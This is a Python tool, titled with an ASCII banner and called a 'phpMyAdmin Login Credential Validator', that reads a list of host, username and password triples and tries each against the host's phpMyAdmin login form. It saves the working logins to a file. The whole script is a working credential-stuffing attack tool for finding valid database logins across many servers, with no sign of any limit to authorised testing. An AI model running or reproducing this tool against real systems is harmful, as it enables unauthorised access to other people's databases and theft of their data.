import requests
import time
import sys
import time


def print_animation(message):
    animation = "|/-\\"
    i = 0
    while True:
        sys.stdout.write("\r" + message + " " + animation[i % len(animation)])
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
        if i == 40:
            break


def check_login(url, username, password):
    try:
        response = requests.post(url, data={"pma_username": username, "pma_password": password}, timeout=5)
        if "pma_username" not in response.text and "pma_password" not in response.text:
            return True
        else:
            return False
    except Exception as e:
        return False


print("\033[1;34m")
print(r'''

██    ██ ███    ██ ██████  ██████  ███████ ██████  ██ ███    ██ ██████  
██    ██ ████   ██ ██   ██      ██ ██           ██ ██ ████   ██ ██   ██ 
██    ██ ██ ██  ██ ██   ██  █████  █████    █████  ██ ██ ██  ██ ██   ██ 
██    ██ ██  ██ ██ ██   ██      ██ ██           ██ ██ ██  ██ ██ ██   ██ 
 ██████  ██   ████ ██████  ██████  ██      ██████  ██ ██   ████ ██████  


''')
print("\033[0m")

print("\033[1;32m")
print("Welcome to the phpMyAdmin Login Credential Validator!")
print("\033[0m")

print("\033[1mBefore proceeding, make sure that your input file follows the required format:\033[0m")
print("\033[1mHOST/phpmyadmin/|USER|PASS\033[0m")

while True:
    input_file_path = input("\n\033[1mEnter the path to the input file containing phpMyAdmin login credentials: \033[0m")
    if not input_file_path:
        print("\033[91mInput file path cannot be empty. Please try again.\033[0m")
        continue
    try:
        with open(input_file_path, "r") as input_file:
            lines = input_file.readlines()
        break
    except FileNotFoundError:
        print(f"\033[91mFile '{input_file_path}' does not exist. Please try again.\033[0m")

while True:
    output_file_path = input("\n\033[1mEnter the path to the output file to save the valid login credentials: \033[0m")
    if not output_file_path:
        print("\033[91mOutput file path cannot be empty. Please try again.\033[0m")
        continue
    if input_file_path == output_file_path:
        print("\033[91mInput and output file paths cannot be the same. Please try again.\033[0m")
        continue
    try:
        with open(output_file_path, "w") as output_file:
            break
    except Exception as e:
        print(f"\033[91mAn error occurred while creating the output file. Please try again.\033[0m")

valid_logins = []
total_lines = len(lines)
processed_lines = 0

print("\n\033[1mProcessing the input file...\033[0m")
print_animation("Processed lines: 0 / {0}".format(total_lines))

for line in lines:
    processed_lines += 1
    parts = line.strip().split("|")
    if len(parts) == 3:
        url = parts[0] + "/phpmyadmin/"
        username = parts[1]
        password = parts[2]
        
        if check_login(url, username, password):
            valid_logins.append(line)
    
    print_animation("Processed lines: {0} / {1}".format(processed_lines, total_lines))

print("\n\n\033[1;32mProcessing completed. Writing valid login credentials to the output file...\033[0m")

with open(output_file_path, "w") as output_file:
    for login in valid_logins:
        output_file.write(login)

print("\n\033[1;32mValid login credentials have been written to the output file successfully!\033[0m")
print("\033[1;32mOutput file path: {0}\033[0m".format(output_file_path))

print("\n\033[1;32mThank you for using the phpMyAdmin Login Credential Validator!\033[0m")
